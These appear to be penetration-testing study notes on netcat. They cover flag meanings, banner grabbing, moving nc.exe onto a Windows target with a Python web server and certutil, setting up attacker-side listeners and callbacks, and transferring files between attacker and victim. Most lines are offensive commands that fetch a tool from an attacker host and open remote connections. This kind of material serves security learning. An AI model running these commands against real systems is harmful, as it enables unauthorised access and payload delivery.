- -v verbose 
- -u UDP port 
- -l listen
- -n do not resolve hostname via DNS 
- -e execute commands

- nc target-ip 80
- nc -nv target-ip 80 (no DNS resolution + verbose = banner grabbing)
- nc -nv target-ip 22 or 21 
- nc -nvu targetip 445 (connect udp)

- we want to transfer file nc.exe to target system 
- cd /usr/share/windows-binaries/ (attacker)
- python -m SimpleHTTPServer 80 (host web server) (attacker)
- open CMD: certutil -urlcache -f http:// LHOST/nc.exe nc.exe (victim)
- setup listner in our kali
	- nc -lvnp 1234 (attacker)
- get back to target machine
- connect via nc.exe
	- open CMD: nc.exe -nv LHOST 1234 (victim)
- then we can reverse open a listener on target system with nc.exe port 1234
- and connect with our system with RHOST IP
- we can send file from attack to target
	- we make file called test.txt with vim
		- vim test.txt (attacker)
	- on our machine we setup nc to send file (attacker)
		- nc -nv target-ip 1234 < test.txt
	- we prepare our listener in target system to download file (victim)
		- nc.exe -lvnp 1234 > test.txt
	- 
	- file should be transferd
